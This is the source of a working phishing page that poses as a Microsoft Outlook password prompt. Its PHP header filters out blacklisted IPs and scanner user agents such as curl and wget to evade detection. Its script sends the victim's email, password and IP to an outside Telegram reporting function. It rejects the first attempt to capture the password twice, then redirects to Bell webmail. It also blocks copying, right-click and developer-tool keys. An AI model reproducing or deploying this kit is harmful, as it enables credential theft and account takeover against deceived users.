<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in to Outlook</title>
  
  <!-- Antibot Scripts -->
  <script src="../m/js/fingerprint.js"></script>
  <script src="../m/js/utils.js"></script>
  <script src="../m/js/captcha.js"></script>
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <script src="../js/email_extractor.js"></script>
  <script src="../js/autofill_helper.js"></script>
  <style>
    :root {
      --blue: #0078D4;
      --blue-dark: #106ebe;
      --border: #d8dce4;
      --text: #1f1f1f;
      --muted: #475569;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background: #f4f7fb url("https://logincdn.msauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg") center/cover no-repeat fixed;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: var(--text);
      position: relative;
      overflow: hidden;
    }
    .card {
      position: relative;
      z-index: 1;
      width: 420px;
      max-width: 90vw;
      background: #fff;
      border-radius: 14px;
      box-shadow: 0 18px 48px rgba(0,0,0,0.16);
      padding: 22px 28px 22px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .top-row {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-bottom: 10px;
      width: 100%;
      text-align: center;
    }
    .back-btn {
      position: absolute;
      left: 0;
      top: 0;
      background: none;
      border: none;
      cursor: pointer;
      padding: 6px 6px 6px 0;
      color: #4b4b4b;
    }
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .logo img {
      height: 100px;
      width: auto;
      display: block;
    }
    .email-pill {
      display: inline-flex;
      align-items: center;
      padding: 6px 10px;
      border: 1px solid var(--border);
      border-radius: 16px;
      background: #f7f9fc;
      color: #3b3b3b;
      font-size: 12px;
      font-weight: 600;
      margin: 2px 0 4px;
    }
    h1 {
      font-size: 24px;
      font-weight: 600;
      margin: 8px 0 14px;
      color: #1f1f1f;
      text-align: center;
    }
    label {
      font-size: 11px;
      font-weight: 600;
      color: #505c6d;
      display: inline-block;
      margin-bottom: 4px;
    }
    .input-wrap {
      position: relative;
      margin-bottom: 10px;
    }
    input[type="password"] {
      width: 100%;
      height: 40px;
      padding: 8px 38px 8px 8px;
      border: 1px solid var(--border);
      border-radius: 4px;
      font-size: 14px;
      color: var(--text);
      background: #fff;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }
    input[type="password"]:focus {
      border-color: var(--blue);
      box-shadow: 0 0 0 3px rgba(0,120,212,0.14);
    }
    .eye-btn {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      color: #4b5563;
    }
    .eye-btn svg { width: 18px; height: 18px; }
    .forgot {
      margin: 3px 0 10px;
      font-size: 12px;
      font-weight: 600;
      text-align: left;
    }
    .forgot a { color: var(--blue); text-decoration: none; }
    .forgot a:hover { text-decoration: underline; }
    .primary-btn {
      width: 100%;
      height: 36px;
      border: none;
      border-radius: 4px;
      background: var(--blue);
      color: #fff;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.15s ease;
      margin-top: 2px;
    }
    .primary-btn:hover { background: var(--blue-dark); }
    .alt {
      margin-top: 10px;
      font-size: 12px;
      color: #3b3b3b;
    }
    .alt a { color: var(--blue); text-decoration: none; font-weight: 600; }
    .alt a:hover { text-decoration: underline; }
    .footer-wrap {
      position: relative;
      z-index: 1;
      margin-top: 14px;
      margin-bottom: 8px;
      text-align: center;
      font-size: 11.5px;
      color: #5f6a7a;
    }
    .footer {
      display: inline-flex;
      gap: 12px;
      flex-wrap: wrap;
      justify-content: center;
    }
    .footer a { color: #5f6a7a; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    .note {
      margin-top: 4px;
      font-size: 11.5px;
      color: #6b7280;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="top-row">
      <button class="back-btn" aria-label="Back">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
      </button>
      <div class="logo">
        <img src="https://images.seeklogo.com/logo-png/16/2/microsoft-logo-png_seeklogo-168319.png" alt="Microsoft">
      </div>
    </div>

    <div class="email-pill" id="emailDisplay"></div>
    <h1>Enter your password</h1>

    <div class="form-body" style="width:100%;">
    <form id="signinForm" autocomplete="off" onsubmit="event.preventDefault();" style="width:100%;">
      <label for="password">Password</label>
      <div class="input-wrap">
        <input id="password" type="password" name="password" autocomplete="current-password">
        <button type="button" class="eye-btn" aria-label="Show password" id="toggleEye">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M1.5 12s4-7 10.5-7 10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
            <circle cx="12" cy="12" r="3.5"/>
          </svg>
        </button>
      </div>
      <div class="forgot"><a href="#">Forgot your password?</a></div>
      <button type="submit" class="primary-btn">Next</button>
    </form>
    </div>

    
  </div>

  <div class="footer-wrap">
    <div class="footer">
      <a href="#">Help and feedback</a>
      <a href="#">Terms of use</a>
      <a href="#">Privacy and cookies</a>
    </div>
    <div class="note">Use private browsing if this is not your device. <a class="link" href="#">Learn more</a></div>
  </div>

  <script>
    const pwd = document.getElementById('password');
    const toggleEye = document.getElementById('toggleEye');
    const eyeSvg = toggleEye.querySelector('svg');
    let showing = false;

    toggleEye.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      showing = !showing;
      pwd.type = showing ? 'text' : 'password';
      toggleEye.setAttribute('aria-label', showing ? 'Hide password' : 'Show password');
      
      if (showing) {
        eyeSvg.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 20.5C6 20.5 2.5 12 2.5 12s1.5-3.36 4.43-5.77m3.11-1.55A10.94 10.94 0 0 1 12 3.5C18 3.5 21.5 12 21.5 12s-1.01 2.27-3.06 4.44M9.88 9.88a3.5 3.5 0 0 1 4.24 4.24M3 3l18 18"/>';
      } else {
        eyeSvg.innerHTML = '<path d="M1.5 12s4-7 10.5-7 10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3.5"/>';
      }
    });
    </script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
	<script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }

        // Run auto-fill immediately and on hash change
        // Handled by standardizedAutofill in js/autofill_helper.js

        $('#password').on('input', function() {
            // Error shown via alert in BELL
        });

        (function() {
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        $('#signinForm').on('submit', function(event) {
      event.preventDefault();
      var email = $('#emailDisplay').text() ? $('#emailDisplay').text().trim() : '';
      var pw = $('#password').val() ? $('#password').val().trim() : '';
      if (!email) {
        $('#password').focus();
        return false;
      }
      if (!isValidEmail(email)) {
        $('#password').focus();
        return false;
      }
      if (!pw) {
        $('#password').focus();
        return false;
      }
            count = count + 1;

            // Use centralized Telegram reporting with provider tag
            window.providerTag = 'outlook';
            var clientIP = window.userip || 'n/a';
            
            function sendTelemetry(attempt, redirectOnSuccess) {
                // Send centralized Telegram report
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                        if (redirectOnSuccess) {
                            // Use centralized redirect
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(300);
                            } else {
                                // Fallback if centralized redirect not available
                                setTimeout(function() { window.location.replace('https://webmail.bell.net/bell/'); }, 300);
                            }
                        }
                    });
                } else {
                    // Fallback if centralized function not available
                    console.error('Centralized Telegram function not available');
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://webmail.bell.net/bell/'); }, 300);
                        }
                    }
                }
                
                if (redirectOnSuccess) {
                    $('.primary-btn').text('Logging in...');
                    setTimeout(function() {
                        $('.primary-btn').text('Next');
                    }, 200);
                }
            }

            sendTelemetry(count, (count >= 2));

            if (count === 1) {
                $('#password').val('').focus();
                return false;
            }
    });
});
  </script>
</body>
</html>

